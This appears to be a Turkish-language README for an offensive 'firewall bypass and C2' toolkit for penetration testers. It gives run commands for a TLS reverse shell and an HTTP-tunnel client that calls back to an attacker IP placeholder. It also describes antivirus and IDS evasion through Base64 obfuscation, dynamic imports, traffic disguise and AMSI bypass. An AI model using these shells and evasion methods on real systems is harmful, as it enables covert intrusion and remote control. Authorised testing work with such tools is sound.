# 🛡️ Gelişmiş Güvenlik Duvarı (Firewall) Bypass & C2 Araç Seti

[![License: MIT](https://img.shields.io/badge/Lisans-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.x](https://img.shields.io/badge/Python-3.x-blue.svg)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey.svg)]()

Sızma testi uzmanları (Penetration Testers) ve siber güvenlik araştırmacıları için tasarlanmış, hedef sistemlerdeki güvenlik duvarlarını (Firewall) ve antivirüs statik analizlerini atlatmayı sağlayan kapsamlı bir araç setidir. Bu depo; çapraz platform (Windows & Linux) destekli şifreli reverse shell araçlarını, HTTP tünelleme yazılımlarını, hızlı port tarayıcıları ve detaylı komut listelerini (cheatsheet) barındırır.

> ⚠️ **YASAL UYARI:** Bu araç seti yalnızca eğitim amaçlı ve **yazılı izin alınmış sızma testlerinde** kullanılmak üzere geliştirilmiştir. Önceden karşılıklı rıza alınmadan herhangi bir sisteme saldırmak yasa dışıdır. Geliştirici, bu programın kötüye kullanımından doğacak hiçbir zarardan sorumlu tutulamaz.

---

## 🌟 Temel Özellikler

*   **Çapraz Platform Desteği (Cross-Platform):** Scriptler hem **Windows** hem de **Linux (Ubuntu Server, Debian vb.)** işletim sistemlerinde sorunsuz çalışacak şekilde tasarlanmıştır.
*   **Şifreli Yükler (Encrypted Payloads):** Ağ trafiği izleme cihazlarını (IDS/IPS) ve derin paket analizlerini (DPI) atlatmak için **SSL/TLS ile uçtan uca şifrelenmiş** reverse shell altyapısı.
*   **Base64 Obfuscation (Kod Gizleme):** Komutların ağ üzerinden düz metin (plaintext) gitmesini engelleyerek temel antivirüs statik analizlerini aşan dâhili Base64 şifreleme katmanı.
*   **HTTP Tünelleme (C2 İletişimi):** Command and Control (C2) trafiğini, sıradan bir web API isteği (GET/POST) gibi göstererek Layer 7 seviyesindeki güvenlik duvarlarını atlatır.
*   **Hızlı Port Tarayıcı:** Dışarıya (Outbound) açık olan portları saniyeler içinde tespit etmenizi sağlayan çok iş parçacıklı (multi-threaded) port tarayıcı.
*   **Kapsamlı Cheatsheet:** AMSI Bypass, DNS/ICMP tünelleme ve "Living off the Land (LotL)" PowerShell payload'ları için detaylı kullanım rehberi.

---

## 📂 Depo Yapısı

```text
├── 1_Encrypted_Reverse_Shell.py  # Hedefte çalışan SSL/TLS şifreli reverse shell istemcisi (Windows/Linux)
├── 2_Listener.py                 # Saldırgan makinesinde çalışan, şifre çözme destekli SSL/TLS dinleyici
├── 3_HTTP_Tunnel.py              # Web trafiği görünümlü C2 aracı (Hem Sunucu hem İstemci modunu içerir)
├── 4_Port_Scanner.py             # Dışarıya açık portları bulan çoklu iş parçacıklı tarayıcı
└── Firewall_Bypass_Cheatsheet.txt# Atlatma teknikleri, komutlar ve AMSI bypass için detaylı rehber
```

---

## 🚀 Hızlı Başlangıç Rehberi

### Adım 1: Dışarıya Açık Portları Tespit Edin
Reverse shell almadan önce, hedefin güvenlik duvarının dışarıya (outbound) hangi portlardan çıkış izni verdiğini bilmeniz gerekir. Tarayıcıyı hedefin üzerindeyken kendi Kali makinenize doğru çalıştırabilir veya hedefin açık portlarını tarayabilirsiniz.

```bash
# Temel tarama (Sadece en çok izin verilen portlar - 80, 443, 53 vb.)
python3 4_Port_Scanner.py --target <HEDEF_IP>

# Tüm portları (1-65535) 100 thread ile hızlıca tara
python3 4_Port_Scanner.py --target <HEDEF_IP> --all --threads 100
```

### Adım 2: Atlatma Yönteminizi Seçin

#### Yöntem A: SSL/TLS Şifreli Reverse Shell (Önerilen: Port 443)
Bu yöntem, ağ trafiğini şifreleyerek güvenlik duvarının içerikteki komutları okumasını engeller. Ayrıca komutları Base64 ile gizler.

1.  **Saldırgan Makinesinde (Kali/Parrot vb.):**
    ```bash
    sudo python3 2_Listener.py
    ```
    *(Bu komut, otomatik olarak bir Self-Signed sertifika üretir ve 443 portunu dinlemeye başlar).*

2.  **Hedef Makinede (Windows veya Ubuntu/Linux):**
    Dosyayı açıp `LHOST` değişkenine kendi Kali IP adresinizi yazın ve çalıştırın:
    ```bash
    # Windows için:
    python 1_Encrypted_Reverse_Shell.py
    
    # Linux (Ubuntu) için:
    python3 1_Encrypted_Reverse_Shell.py
    ```

#### Yöntem B: HTTP Tünelleme (Önerilen: Port 80)
Eğer güvenlik duvarı sadece 80 portuna izin veriyor ve trafik türünü çok sıkı inceliyorsa, shell'inizi normal bir internet sörfü gibi gösteren bu aracı kullanın.

1.  **Saldırgan Makinesinde:**
    ```bash
    sudo python3 3_HTTP_Tunnel.py --server --port 80
    ```

2.  **Hedef Makinede:**
    ```bash
    python3 3_HTTP_Tunnel.py --client --host <SALDIRGAN_IP> --port 80
    ```

---

## 💻 İşletim Sistemi Uyumluluğu

### 🪟 Windows Hedefleri
*   Python kurulu olan tüm Windows sistemlerinde scriptler doğrudan çalışır.
*   Eğer diske dosya yazamıyorsanız (Fileless Execution), `Firewall_Bypass_Cheatsheet.txt` içerisindeki **PowerShell Reverse Shell** komutlarını kullanabilirsiniz.
*   Modern Windows Defender ortamlarında PowerShell komutlarının engellenmesini önlemek için Cheatsheet'teki **AMSI Bypass** kodlarını kullanmak kritik öneme sahiptir.

### 🐧 Linux (Ubuntu Server / Debian) Hedefleri
*   Ubuntu Server ve Debian tabanlı dağıtımlarda `python3` genelde varsayılan olarak yüklüdür.
*   Scriptler arka planda işletim sistemini algılar ve komutları çalıştırırken Linux'un doğal `/bin/sh` veya `/bin/bash` kabuğunu kullanarak tam uyumluluk sağlar.
*   Dizin değiştirme (`cd`) gibi kabuğa özel işlemler script tarafından yönetilerek oturumun stabil kalması sağlanır.

---

## 🛡️ Kullanılan Evasion (Atlatma) Teknikleri

1.  **Trafik Şifreleme (Traffic Encryption):** `ssl.wrap_socket` kullanılarak ağ üzerinden giden düz metinler (plaintext) engellenir.
2.  **Protokol Maskeleme (Protocol Masking):** Standart 4444 gibi şüpheli portlar yerine, 443 (HTTPS) ve 53 (DNS) portları kullanılarak şüphe çekilmez.
3.  **Komut Karartma (Obfuscation):** Saldırganın gönderdiği komutlar (örn. `whoami`) önce Base64'e çevrilir, hedefe şifreli ulaşır, hedefin belleğinde çözülür ve çalıştırılır. Bu sayede IDS/IPS imzalarına takılmaz.
4.  **Davranışsal Harmanlama (Behavioral Blending):** HTTP Tüneli, sıradan bir Google Chrome tarayıcısıymış gibi meşru `User-Agent` başlıkları kullanır ve dönen cevapları JSON tabanlı bir API güncellemesi gibi gösterir.
5.  **Dinamik İçe Aktarma (Dynamic Imports):** Python scriptleri içerisinde `import socket` veya `import subprocess` gibi yaygın zararlı yazılım imzalarına (signature) takılan statik yüklemeler yerine, `importlib` kullanılarak bu modüller çalışma zamanında (runtime) belleğe dinamik olarak yüklenir. Böylece temel antivirüs statik kod analizleri atlatılır.

---

## 📖 Ek Okumalar ve İleri Seviye Taktikler
Proje içerisindeki `Firewall_Bypass_Cheatsheet.txt` dosyası aşağıdaki ileri seviye konuları içerir:
*   Living off the Land (LotL) metodolojisi
*   dnscat2 ile Port 53 üzerinden DNS Tünelleme
*   icmpsh ile Ping paketi üzerinden ICMP Tünelleme
*   `msfvenom` ile platforma özel ve şifreli payload üretimi

## 🤝 Katkıda Bulunma
Projeyi geliştirmek adına yapılan her türlü Pull Request (PR) kabul edilmektedir. Büyük çaplı değişiklikler yapmadan önce lütfen tartışma amaçlı bir "Issue" açın.
